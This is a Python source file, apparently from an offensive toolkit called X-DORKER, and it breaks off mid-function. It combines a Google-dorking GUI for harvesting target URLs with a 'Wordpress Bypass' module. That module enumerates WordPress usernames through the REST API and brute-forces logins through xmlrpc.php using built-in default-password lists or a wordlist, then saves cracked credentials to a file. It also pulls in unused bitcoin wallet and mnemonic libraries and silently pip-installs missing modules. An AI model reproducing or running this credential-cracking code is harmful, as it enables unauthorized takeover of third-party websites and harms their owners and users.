################################################################################################################################################
from terminaltables import AsciiTable
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import Pool
from urllib.parse import urlparse, urljoin
from os.path import exists
from urllib.parse import urlparse, unquote
from datetime import datetime
from colorama import Fore
from bottle import Bottle, run
import os
import socket
import time
import re, random
import sys
import asyncio
import threading
import random
import json
import subprocess, datetime
import http.server
import socketserver
import requests
import ctypes
import select
import sys
import warnings
import threading
import urllib.request
import warnings, sys;warnings.filterwarnings("ignore");sys.stderr = open(os.devnull, "w")
################################################################################################################################################
global user_agents
user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
global device

global sql_vuln, admin_paths
sql_vuln = []
admin_paths = []

def table_print(head, init):
    table_data = [head] + [init]
    table = AsciiTable(table_data)
    print(table.table)

def check():
    try:
        is_android = os.path.exists('/system/bin/app_process') or os.path.exists('/system/bin/app_process32')

        if is_android:
            return 0
        else:
            return 1

    except Exception as e:
        return f"Error: {e}"
device = check()
try:
    if device != 0:
        from scapy.all import *
        from PIL import Image, ImageTk
        import tkinter as tk
        from bitcoinlib.wallets import HDKey
        from mnemonic import Mnemonic
        from bitcoinlib.services.services import Service
    else:
        pass
    from urllib.parse import urlparse
    from requests import Timeout, RequestException
    from fake_useragent import UserAgent
    from requests import Timeout
    from urllib.parse import urlparse
    from os.path import exists
    from colorama import *
    from multiprocessing import Pool
    from sys import *
    from http.cookiejar import LWPCookieJar
    from fake_useragent import UserAgent
    from concurrent.futures import ThreadPoolExecutor
    from colored import stylize
    from requests.cookies import RequestsCookieJar
    import requests, os
    import aiohttp
    import time
    import subprocess
    import psutil
    import cloudscraper, requests, os, threading, random, httpx
    import datetime, colored
    import socket, socks, time, ssl, sys
    import getpass
    import sys, subprocess, re
    import platform as pf
    import undetected_chromedriver as webdriver
    import struct
    import requests
    import json
    import random
    import asyncio
    import pexpect
    import re
    try:
        import edge_tts
        from pydub import AudioSegment
        import simpleaudio as sa
        from deep_translator import GoogleTranslator
        loaded = True
    except:
        loaded = False
        pass
except ModuleNotFoundError as e:
    print(f"[!] Module not found: "+str(e))
    module = str(e).replace("No module named '", '').replace("'", '')
    print(f"[+] Installing module: {module}")
    os.system(f'python3 -m pip install {module}')

def xdorker():
    global stop_search, saved, e_m, e_l
    stop_search = False
    saved = False
    e_m = False
    e_l = False

    def saving_log(data):
        entry_content = entry_sas.get("1.0", "end-1c")
        if '.txt' not in entry_content:
            entry_content += ".txt"
        with open(entry_content, 'a') as file:
            file.write(data + '\n')

    def save_status_codes():
        data = status_codez.get("1.0", "end-1c")
        saving_log(data)

    def country():
        data = countrys.get("1.0", "end-1c")
        return data

    def execute(command):
        global stop_search, saved, result
        result = []
        code = []
        ua = UserAgent()
        cr = country()
        try:
            if e_m:
                for commands in command:
                    if stop_search:
                        break
                    for url in search(commands, start=0, stop=None, pause=1, num=random.randint(1, 5), user_agent=ua.chrome, country=cr):
                        if stop_search:
                            break
                        result.append(url)
                        root.after(0, lambda url=url: update_result_partial(url))
                    if not result:
                        result.append("No results found")
                    if not code:
                        code.append("No results found")
            elif e_l:
                for url in search(command, start=0, stop=None, pause=1, num=random.randint(1, 5), user_agent=ua.chrome, country=cr):
                    if stop_search:
                        break
                    result.append(url)
                    root.after(0, lambda url=url: update_result_partial(url))
                if not result:
                    result.append("No results found")
                if not code:
                    code.append("No results found")
            else:
                result.append("Please insert dork")
        except Exception as e:
            result.append(str(e))
            print(e)
        return result

    def check_status_code():
        code = []
        start_animation_check()
        for url in result:
            try:
                head = {"User-Agent": UserAgent().chrome}
                response = requests.get(url, timeout=5, headers=head)
                After_yes = f"{response.status_code} - {url}"
                code.append(After_yes)
                root.after(0, lambda After_yes=After_yes: update_result_partial_code(After_yes))
            except Timeout:
                After_no = f"Timeout - {url}"
                root.after(0, lambda After_no=After_no: update_result_partial_code(After_no))
            except:
                continue
        root.after(0, stop_animation)

    def execute_command():
        global stop_search, e_m, e_l
        stop_search = False
        e_m = True
        e_l = False
        command = entry_middle.get("1.0", tk.END)
        command = command.split('.-.')
        print(command)
        threading.Thread(target=run_execute, args=(command,)).start()

    def execute_command_left():
        global stop_search, e_m, e_l
        stop_search = False
        e_m = False
        e_l = True
        command = entry_left.get("1.0", tk.END).strip()
        print(command)
        threading.Thread(target=run_execute, args=(command,)).start()

    def run_execute(command):
        start_animation()
        result = execute(command)
        root.after(0, lambda: update_result_final(result))
        root.after(0, stop_animation)

    def update_result_partial(result):
        entry_right.config(state="normal")
        entry_right.insert(tk.END, result + "\n")
        entry_right.config(state="disabled")

    def update_result_partial_code(result):
        status_codez.config(state="normal")
        status_codez.insert(tk.END, result + "\n")
        status_codez.config(state="disabled")

    def update_result_final(result):
        entry_right.config(state="normal")
        entry_right.insert(tk.END, "\n".join(result) + "\n")
        entry_right.config(state="disabled")

    def update_result_code(resultz):
        status_codez.config(state="normal")
        status_codez.insert(tk.END, "\n".join(resultz) + "\n")
        status_codez.config(state="disabled")

    def interrupt_search():
        global stop_search
        stop_search = True

    def saving():
        global saved
        saved = True
        try:
            os.mkdir('Output_File')
        except:
            pass
        save_status_codes()

    def split_text():
        text = entry_left.get("1.0", tk.END).strip()
        split_text = text.split('.-.')
        entry_middle.config(state="normal")
        entry_middle.delete("1.0", tk.END)
        entry_middle.insert("1.0", split_text)
        entry_middle.config(state="disabled")

    def delete_text():
        entry_left.delete("1.0", tk.END)

    def delete_output():
        entry_right.config(state="normal")
        entry_right.delete("1.0", tk.END)
        entry_right.config(state="disabled")

    def delete_scode():
        status_codez.config(state="normal")
        status_codez.delete("1.0", tk.END)
        status_codez.config(state="disabled")

    def start_animation():
        global working_text, animating
        working_text = ["Working.", "Working..", "Working..."]
        animating = True
        animate_text()

    def start_animation_check():
        global working_text, animating
        working_text = ["Checking.", "Checking..", "Checking..."]
        animating = True
        animate_text()

    def stop_animation():
        global animating
        animating = False
        label_animation.config(text="")

    def animate_text():
        if animating:
            current_text = working_text.pop(0)
            working_text.append(current_text)
            label_animation.config(text=current_text)
            root.after(500, animate_text)

    def cek_setatus():
        threading.Thread(target=check_status_code).start()

    root = tk.Tk()
    root.resizable(False, False)
    root.title("X-DORKER By MrSanZz")

    image = Image.open('img/source/HFz7Cq.png')
    image_resized = image.resize((230, 230), Image.LANCZOS)
    photo = ImageTk.PhotoImage(image_resized)
    label_logo = tk.Label(root, image=photo)
    label_logo.image = photo
    label_logo.pack()
    root.iconbitmap('img/source/HPrCoK.ico')

    frame = tk.Frame(root)
    frame.pack(padx=10, pady=10)

    frame2 = tk.Frame(root)
    frame2.pack(side="right", padx=10, pady=10)

    entry_sas = tk.Text(frame2, height=1, width=20)
    entry_sas.grid(row=0, column=1, padx=5, pady=5)

    button_save_scode = tk.Button(frame2, text="Save", command=saving)
    button_save_scode.grid(column=1, padx=5, pady=5)

    countrys = tk.Text(frame2, height=1, width=5)
    countrys.grid(row=0, column=2, padx=5, pady=5)

    teks = tk.Label(frame, text="Status_Code")
    teks.grid(row=1, column=0, padx=5, pady=5)

    teks = tk.Label(frame, text="Input")
    teks.grid(row=1, column=1, padx=5, pady=5)

    teks = tk.Label(frame, text="Split")
    teks.grid(row=1, column=2, padx=5, pady=5)

    teks = tk.Label(frame, text="Output")
    teks.grid(row=1, column=3, padx=5, pady=5)

    status_codez = tk.Text(frame, height=10, width=35, state="disabled")
    status_codez.grid(row=0, column=0, padx=5, pady=5)

    entry_left = tk.Text(frame, height=10, width=40)
    entry_left.grid(row=0, column=1, padx=5, pady=5)

    entry_middle = tk.Text(frame, height=10, width=40, state="disabled")
    entry_middle.grid(row=0, column=2, padx=5, pady=5)

    entry_right = tk.Text(frame, height=10, width=34, state="disabled")
    entry_right.grid(row=0, column=3, padx=5, pady=5)

    button_frame = tk.Frame(root)
    button_frame.pack(padx=10, pady=10)

    button_execute = tk.Button(button_frame, text="Execute", command=execute_command)
    button_execute.grid(row=0, column=0, padx=5, pady=5)

    button_execute2 = tk.Button(button_frame, text="Execute (E Left)", command=execute_command_left)
    button_execute2.grid(row=0, column=1, padx=5, pady=5)

    button_execute2 = tk.Button(button_frame, text="Check Status Code", command=cek_setatus)
    button_execute2.grid(row=0, column=2, padx=5, pady=5)

    button_interrupt = tk.Button(button_frame, text="Interrupt", command=interrupt_search)
    button_interrupt.grid(row=0, column=3, padx=5, pady=5)

    button_split = tk.Button(button_frame, text="Split", command=split_text)
    button_split.grid(row=0, column=4, padx=5, pady=5)

    button_delete_text = tk.Button(button_frame, text="Clear Input", command=delete_text)
    button_delete_text.grid(row=0, column=5, padx=5, pady=5)

    button_delete_output = tk.Button(button_frame, text="Clear Output", command=delete_output)
    button_delete_output.grid(row=0, column=6, padx=5, pady=5)

    button_delete_scode = tk.Button(button_frame, text="Clear Status_Code", command=delete_scode)
    button_delete_scode.grid(row=0, column=7, padx=5, pady=5)

    label_animation = tk.Label(root, text="")
    label_animation.pack(pady=10)

    new_window = tk.Toplevel(root)
    new_window.resizable(False, False)
    new_window.title("X-DORKER By MrSanZz - Wordpress Bypass")

    image = Image.open('img/source/HFz7Cq.png')
    image_resized = image.resize((230, 230), Image.LANCZOS)
    photo = ImageTk.PhotoImage(image_resized)
    label_logo = tk.Label(new_window, image=photo)
    label_logo.image = photo
    label_logo.pack()
    new_window.iconbitmap('img/source/HPrCoK.ico')

    interrupt = False
    use_wordlist = False

    def outdit(s):
        entry_out.config(state="normal")
        entry_out.insert(tk.END, "".join(s) + "\n")
        entry_out.config(state="disabled")

    def outdit2(s):
        entry_out1.config(state="normal")
        entry_out1.insert(tk.END, "".join(s) + "\n")
        entry_out1.config(state="disabled")

    def get_usernames(url):
        try:
            ua = UserAgent()
            head = {"User-Agent": ua.chrome}
            users_url = url+ '/wp-json/wp/v2/users'
            response = requests.get(users_url, timeout=7, headers=head)

            if response.status_code == 200:
                users = response.json()
                usernames = []
                for user in users:
                    for key in ['slug', 'name', 'username', 'author']:
                        if key in user:
                            usernames.append(user[key])
                            break
                    else:
                        e2 = "Can't find username"
                        outdit(e2)
                return usernames
            else:
                e3 = f"Fail to get username from {url}"
                outdit(e3)
                return []
        except requests.exceptions.RequestException as e:
            e4 = f"Fail to get username from {url}"
            outdit(e4)
            return []

    def parse(url):
        if '/wp-login.php' in url:
            url = url.replace('wp-login.php', '/xmlrpc.php')
        elif '/xmlrpc.php' in url:
            url = url
            pass
        elif '/xmlrpc.php' in url is None:
            url = url + '/xmlrpc.php'
        headers = {"User-Agent": UserAgent().chrome}
        response = requests.get(url, headers=headers, timeout=7)
        if response.status_code == 200 or response.status_code == 405:
            if 'XML-RPC' in response.text:
                out1 = "[+] Valid xmlrpc.php\n"
                outdit(out1)
            else:
                out2 = "[+] xmlrpc.php not detected in {}".format(url)
                outdit(out2)
                url = url + '/xmlrpc.php'
                out3 = "[+] Adding xmlrpc.php path to url {}\n".format(url)
                responses = requests.get(url, headers={"User-Agent": UserAgent().chrome}, timeout=7)
                if responses.status_code == 200:
                    if 'XML-RPC' in responses.text:
                        azz = "[+] {} Is Valid - {}\n".format(url, responses.status_code)
                else:
                    azz = "[+] {} Not Valid - {}\n".format(url, responses.status_code)
                outdit(out3)
                outdit(azz)
        else:
            out4 = "[+] Url is not valid! {}\n".format(response.status_code)
            outdit(out4)
            return url
    def bruteforce(url):
        try:
            usernames = get_usernames(url)
            if usernames:
                oo = "[+] Username valid: {}".format(usernames)
            else:
                oo = "[+] Username not detected."
            outdit(oo)
            ea = 'Checking URL : {}'.format(url)
            outdit(ea)
            url = parse(url)

            if not usernames:
                usernames = ['admin']
            if use_wordlist:
                with open(entry_word.get("1.0", "end-1c"), 'r') as file:
                    worlist = file.readlines()
                for username in usernames:
                    Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                    if any(Sign in username for Sign in Signs):
                        continue
                    if username.lower() == 'admin':
                        for password in worlist:
                            xml_payload = "<methodCall>\n"
                            xml_payload += "    <methodName>wp.getUsersBlogs</methodName>\n"
                            xml_payload += "    <params>\n"
                            xml_payload += f"        <param><value>{username}</value></param>\n"
                            xml_payload += f"        <param><value>{password}</value></param>\n"
                            xml_payload += "    </params>\n"
                            xml_payload += "</methodCall>"
                            ua = UserAgent()
                            head = {"User-Agent": ua.chrome}
                            try:
                                response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                                if 'blogName' in response.text:
                                    s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                    outdit2(s1)
                                    with open("result.txt", "a") as result_file:
                                        result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                    return True
                                else:
                                    s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                    outdit(s2)
                                if interrupt:
                                    break
                            except TimeoutError:
                                continue
                    else:
                        for password in [username]:
                            xml_payload = "<methodCall>\n"
                            xml_payload += "    <methodName>wp.getUsersBlogs</methodName>\n"
                            xml_payload += "    <params>\n"
                            xml_payload += f"        <param><value>{username}</value></param>\n"
                            xml_payload += f"        <param><value>{password}</value></param>\n"
                            xml_payload += "    </params>\n"
                            xml_payload += "</methodCall>"
                            ua = UserAgent()
                            head = {"User-Agent": ua.chrome}
                            try:
                                response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                                if 'blogName' in response.text:
                                    s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                    outdit2(s1)
                                    with open("result.txt", "a") as result_file:
                                        result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                    return True
                                else:
                                    s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                    outdit(s2)
                                if interrupt:
                                    break
                            except TimeoutError:
                                continue
            else:
                for username in usernames:
                    Signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                    if any(Sign in username for Sign in Signs):
                        continue
                    if username.lower() == 'admin':
                        for password in ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024','admin1234','admin2023','admin2025','admin2021','admin2022','admin1234','admin2019','admin2018','admincobain','admintest','adminbiasa','admin456','adminftp','admin1212','admin1313','admin1414','admin1515','admin1616','admin1717','admin1818','admin1919','admin2020','adminwordpres','adminaja','admin1','admin2','admin3','admin4','admin5','adminroot']:
                            xml_payload = "<methodCall>\n"
                            xml_payload += "    <methodName>wp.getUsersBlogs</methodName>\n"
                            xml_payload += "    <params>\n"
                            xml_payload += f"        <param><value>{username}</value></param>\n"
                            xml_payload += f"        <param><value>{password}</value></param>\n"
                            xml_payload += "    </params>\n"
                            xml_payload += "</methodCall>"
                            ua = UserAgent()
                            head = {"User-Agent": ua.chrome}
                            try:
                                response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                                if 'blogName' in response.text:
                                    s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                    outdit2(s1)
                                    with open("result.txt", "a") as result_file:
                                        result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                    return True
                                else:
                                    s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                    outdit(s2)
                                if interrupt:
                                    break
                            except TimeoutError:
                                continue
                    else:
                        for password in [username]:
                            xml_payload = "<methodCall>\n"
                            xml_payload += "    <methodName>wp.getUsersBlogs</methodName>\n"
                            xml_payload += "    <params>\n"
                            xml_payload += f"        <param><value>{username}</value></param>\n"
                            xml_payload += f"        <param><value>{password}</value></param>\n"
                            xml_payload += "    </params>\n"
                            xml_payload += "</methodCall>"
                            ua = UserAgent()
                            head = {"User-Agent": ua.chrome}
                            try:
                                response = requests.post(url, data=xml_payload, timeout=7, headers=head)

                                if 'blogName' in response.text:
                                    s1 = f"!=Successfully=! {url}/wp-login.php#{username}@{password}"
                                    outdit2(s1)
                                    with open("result.txt", "a") as result_file:
                                        result_file.write(f"{url}/wp-login.php#{username}@{password}\n")
                                    return True
                                else:
                                    s2 = f"!=FAILED=! {url}/wp-login.php#{username}@{password}"
                                    outdit(s2)
                                if interrupt:
                                    break
                            except TimeoutError:
                                continue

        except requests.exceptions.RequestException as e:
            e6 = "Failed to connecting to the url"
            outdit(e6)
        except Exception as e:
            outdit(e)
            e7 = "An error occured"
            outdit(e7)
        return False

    def main(url):
        bruteforce(url)

    def execute_bps():
        urled = entry_saz.get("1.0", "end-1c")
        urled = urled.split()
        if not urled:
            requi = 'Please insert url.'
            outdit(requi)
        else:
            passwords = ['admin', 'pass', 'user', 'administrator', 'demo', 'test', 'qwerty', 'root','Admin@123', 'admin@123', 'admin123', 'Admin', 'Admin11@', 'admin@123#', 'adminPass', 'Admin@123#', 'Password@123', 'admin2024', 'admin@2024','admintest','adminwordpres','admin1234','admin@2023','admin@2022','adminlocalhost','admin@wordpres','admin@1945','admin@12345','admin@wp','admintest123','admin@party','admin@12345','adminqwerty','admin@pass','admin1453','test123#','test123','admin1337','adminwp','admin@user','admin@pass','adminroot']

            if interrupt is not True:
                for urls in urled:
                    main(urls)
                    if interrupt:
                        break

    def start_animations():
        global working_text2z, animating2z
        working_text2z = ["Working /", "Working -", "Working \\", "Working |", "Working /", "Working -", "Working \\", "Working |"]
        animating2z = True
        animate_texts()

    def stop_animations():
        global animating2z
        animating2z = False
        label_animation2.config(text="")

    def animate_texts():
        if animating2z:
            current_text2z = working_text2z.pop(0)
            working_text2z.append(current_text2z)
            label_animation2.config(text=current_text2z)
            new_window.after(500, animate_texts)

    def run_ekecute():
        start_animations()
        result = execute_bps()
        new_window.after(0, lambda: update_result_final(result))
        new_window.after(0, stop_animations)

    def starting():
        global interrupt
        interrupt = False
        threading.Thread(target=run_ekecute).start()

    def interrupt_bps():
        global interrupt
        interrupt = True

    def clear_input():
        entry_saz.delete("1.0", tk.END)

    def clear_output():
        entry_out.config(state="normal")
        entry_out.delete("1.0", tk.END)
        entry_out.config(state="disabled")

    def clear_output2():
        entry_out1.config(state="normal")
        entry_out1.delete("1.0", tk.END)
        entry_out1.config(state="disabled")

    def wordlist():
        global use_wordlist
        use_wordlist = True

    def stop_wordlist():
        global use_wordlist
        use_wordlist = False

    frame2z = tk.Frame(new_window)
    frame2z.pack(side="right", padx=10, pady=10)

    frame3z = tk.Frame(new_window)
    frame3z.pack(padx=10, pady=10)

    button_frame2z = tk.Frame(new_window)
    button_frame2z.pack(padx=10, pady=10)

    teks = tk.Label(frame3z, text="Word-List")
    teks.grid(row=1, column=0, padx=5, pady=5)

    teks = tk.Label(frame3z, text="Input")
    teks.grid(row=1, column=1, padx=5, pady=5)

    teks = tk.Label(frame3z, text="Output")
    teks.grid(row=1, column=2, padx=5, pady=5)

    teks = tk.Label(frame3z, text="Crack_Output")
    teks.grid(row=1, column=3, padx=5, pady=5)

    entry_word = tk.Text(frame3z, height=1, width=10)
    entry_word.grid(row=0, column=0, padx=5, pady=5)

    entry_saz = tk.Text(frame3z, height=10, width=40)
    entry_saz.grid(row=0, column=1, padx=5, pady=5)

    entry_out = tk.Text(frame3z, height=10, width=55, state="disabled")
    entry_out.grid(row=0, column=2, padx=5, pady=5)

    entry_out1 = tk.Text(frame3z, height=10, width=50, state="disabled")
    entry_out1.grid(row=0, column=3, padx=5, pady=5)

    button_frame = tk.Frame(new_window)
    button_frame.pack(padx=10, pady=10)

    button_execute = tk.Button(button_frame2z, text="Execute", command=starting)
    button_execute.grid(row=0, column=0, padx=5, pady=5)

    button_executes = tk.Button(button_frame2z, text="Use Wordlist", command=wordlist)
    button_executes.grid(row=0, column=1, padx=5, pady=5)

    button_executez = tk.Button(button_frame2z, text="Stop use Wordlist", command=stop_wordlist)
    button_executez.grid(row=0, column=2, padx=5, pady=5)

    button_interrupt = tk.Button(button_frame2z, text="Interrupt", command=interrupt_bps)
    button_interrupt.grid(row=0, column=3, padx=5, pady=5)

    button_split = tk.Button(button_frame2z, text="Clear Input", command=clear_input)
    button_split.grid(row=0, column=4, padx=5, pady=5)

    button_delete_text = tk.Button(button_frame2z, text="Clear Output", command=clear_output)
    button_delete_text.grid(row=0, column=5, padx=5, pady=5)

    button_split = tk.Button(button_frame2z, text="Clear Crack_Output", command=clear_output2)
    button_split.grid(row=0, column=6, padx=5, pady=5)

    label_animation2 = tk.Label(new_window, text="")
    label_animation2.pack(pady=10)
    root.mainloop()

################################################################################################################################################

try:
    import googlesearch, requests, cloudscraper, wget, fake_useragent, re
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
except ModuleNotFoundError as module:
    raise Exception('Module Not Found: ', module)
if sys.version_info[0] > 2:
    from http.cookiejar import LWPCookieJar
    from urllib.request import Request, urlopen
    from urllib.parse import quote_plus, urlparse, parse_qs
else:
    from cookielib import LWPCookieJar
    from urllib import quote_plus
    from urllib2 import Request, urlopen
    from urlparse import urlparse, parse_qs

try:
    from bs4 import BeautifulSoup
    is_bs4 = True
except ImportError:
    from bs4 import BeautifulSoup
    is_bs4 = False

__all__ = [

    'search',

    'lucky',

    'get_random_user_agent', 'get_tbs',
]

url_home = "https://www.google.%(tld)s/"
url_search = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
             "btnG=Google+Search&tbs=%(tbs)s&safe=%(safe)s&" \
             "cr=%(country)s"
url_next_page = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
                "start=%(start)d&tbs=%(tbs)s&safe=%(safe)s&" \
                "cr=%(country)s"
url_search_num = "https://www.google.%(tld)s/search?hl=%(lang)s&q=%(query)s&" \
                 "num=%(num)d&btnG=Google+Search&tbs=%(tbs)s&safe=%(safe)s&" \
                 "cr=%(country)s"
url_next_page_num = "https://www.google.%(tld)s/search?hl=%(lang)s&" \
                    "q=%(query)s&num=%(num)d&start=%(start)d&tbs=%(tbs)s&" \
                    "safe=%(safe)s&cr=%(country)s"
url_parameters = (
    'hl', 'q', 'num', 'btnG', 'start', 'tbs', 'safe', 'cr')

home_folder = '/__system.file__'
cookie_jar = LWPCookieJar(os.path.join(home_folder, '.google-cookie'))
try:
    cookie_jar.load()
except Exception:
    pass

USER_AGENT = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)'

try:
    install_folder = os.path.abspath(os.path.split(__file__)[0])
    try:
        user_agents_file = os.path.join(install_folder, 'user_agents.txt.gz')
        import gzip
        fp = gzip.open(user_agents_file, 'rb')
        try:
            user_agents_list = [_.strip() for _ in fp.readlines()]
        finally:
            fp.close()
            del fp
    except Exception:
        user_agents_file = os.path.join(install_folder, 'user_agents.txt')
        with open(user_agents_file) as fp:
            user_agents_list = [_.strip() for _ in fp.readlines()]
except Exception:
    user_agents_list = [USER_AGENT]


def get_random_user_agent():
    """
    Get a random user agent string.

    :rtype: str
    :return: Random user agent string.
    """
    return random.choice(user_agents_list)
def get_tbs(from_date, to_date):
    from_date = from_date.strftime('%m/%d/%Y')
    to_date = to_date.strftime('%m/%d/%Y')
    return 'cdr:1,cd_min:%(from_date)s,cd_max:%(to_date)s' % vars()
def get_page(url, user_agent=None, verify_ssl=True):
    if user_agent is None:
        user_agent = USER_AGENT
    request = Request(url)
    request.add_header('User-Agent', user_agent)
    cookie_jar.add_cookie_header(request)
    if verify_ssl:
        response = urlopen(request)
    else:
        context = ssl._create_unverified_context()
        response = urlopen(request, context=context)
    cookie_jar.extract_cookies(response, request)
    html = response.read()
    response.close()
    try:
        cookie_jar.save()
    except Exception:
        pass
    return html
def filter_result(link):
    try:
        if link.startswith('/url?'):
            o = urlparse(link, 'http')
            link = parse_qs(o.query)['q'][0]
        o = urlparse(link, 'http')
        if o.netloc and 'google' not in o.netloc:
            return link
    except Exception:
        pass
def search(query, tld='com', lang='en', tbs='0', safe='off', num=10, start=0,
           stop=None, pause=2.0, country='', extra_params=None,
           user_agent=None, verify_ssl=True):
    hashes = set()
    count = 0
    query = quote_plus(query)
    if not extra_params:
        extra_params = {}
    for builtin_param in url_parameters:
        if builtin_param in extra_params.keys():
            raise ValueError(
                'GET parameter "%s" is overlapping with \
                the built-in GET parameter',
                builtin_param
            )
    get_page(url_home % vars(), user_agent, verify_ssl)
    if start:
        if num == 10:
            url = url_next_page % vars()
        else:
            url = url_next_page_num % vars()
    else:
        if num == 10:
            url = url_search % vars()
        else:
            url = url_search_num % vars()
    while not stop or count < stop:
        last_count = count
        for k, v in extra_params.items():
            k = quote_plus(k)
            v = quote_plus(v)
            url = url + ('&%s=%s' % (k, v))
        time.sleep(pause)
        html = get_page(url, user_agent, verify_ssl)
        if is_bs4:
            soup = BeautifulSoup(html, 'html.parser')
        else:
            soup = BeautifulSoup(html)
        try:
            anchors = soup.find(id='search').find_all('a')
        except AttributeError:
            gbar = soup.find(id='gbar')
            if gbar:
                gbar.clear()
            anchors = soup.find_all('a')
        for a in anchors:
            try:
                link = a['href']
            except KeyError:
                continue
            link = filter_result(link)
            if not link:
                continue
            h = hash(link)
            if h in hashes:
                continue
            hashes.add(h)
            yield link
            count += 1
            if stop and count >= stop:
                return
        if last_count == count:
            break
        start += num
        if num == 10:
            url = url_next_page % vars()
        else:
            url = url_next_page_num % vars()

def lucky(*args, **kwargs):
    """
    Shortcut to single-item search.

    Same arguments as the main search function, but the return value changes.

    :rtype: str
    :return: URL found by Google.
    """
    return next(search(*args, **kwargs))

global now_path
now_path = ""

class login:
    def check_openssl():
        def check_openssl_installed():
            try:
                result = subprocess.run(['openssl', 'version'], 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE,
                                    text=True)
                if "OpenSSL" in result.stdout:
                    print("[✓] OpenSSL is already installed:", result.stdout.strip())
                    with open('__system.file__/LOG_/ssl.log', 'a') as file:
                        file.write(str('verified')+'\r')
                    return True
                return False
            except FileNotFoundError:
                return False

        def install_openssl_windows():
            print("[!] OpenSSL not found on Windows")
            openssl_url = "https://slproweb.com/download/Win64OpenSSL-3_1_4.exe"
            print("[↓] Downloading OpenSSL for Windows...")
            
            try:
                urllib.request.urlretrieve(openssl_url, "OpenSSL_Installer.exe")
                print("[!] Please run the installer manually: OpenSSL_Installer.exe")
                print("[!] Make sure to select 'Add OpenSSL to PATH' during installation")
                os.startfile("OpenSSL_Installer.exe")
            except Exception as e:
                print("[X] Failed to download:", e)

        def install_openssl_linux():
            print("[!] Attempting to install OpenSSL on Linux...")
            try:
                distro = pf.freedesktop_os_release().get('ID', '').lower()
                
                if distro in ['debian', 'ubuntu', 'pop']:
                    subprocess.run(['sudo', 'apt', 'update'], check=True)
                    subprocess.run(['sudo', 'apt', 'install', '-y', 'openssl'], check=True)
                elif distro in ['centos', 'fedora', 'rhel']:
                    subprocess.run(['sudo', 'yum', 'install', '-y', 'openssl'], check=True)
                elif distro in ['arch', 'manjaro']:
                    subprocess.run(['sudo', 'pacman', '-Sy', '--noconfirm', 'openssl'], check=True)
                else:
                    print("[X] Unsupported distro, please install manually:")
                    print("    https://www.openssl.org/source/")
                    return
                    
                print("[✓] OpenSSL installed successfully")
            except subprocess.CalledProcessError as e:
                print("[X] Failed to install:", e)
            except Exception as e:
                print("[X] Error:", e)

        def main():
            system = pf.system()
            print(f"[•] Detected operating system: {system}")

            if check_openssl_installed():
                if not exists('server.crt'):
                    os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes')
                return

            print("[!] OpenSSL not found!")
            answer = input("[?] Do you want to install OpenSSL? (y/n): ").strip().lower()

            if answer != 'y':
                print("[!] Installation canceled")
                return

            if system == "Windows":
                install_openssl_windows()
            elif system == "Linux":
                if device == 1:
                    install_openssl_linux()
                else:
                    os.system('pkg install openssl')
                    os.system('pkg install openssl-tool')
            else:
                print("[X] Unsupported operating system")

        if __name__ == "__main__":
            main()
    def check_folder():
        if not exists('__system.file__'):
            os.makedirs('__system.file__')
            print("\033[1;34m[+]\033[0m Folder '__system.file__' created successfully!")
        if not exists('__system.file__/LOG_'):
            os.makedirs('__system.file__/LOG_')
            print("\033[1;34m[+]\033[0m Folder 'LOG_' created successfully!")
        if not exists('__system.file__/USER_'):
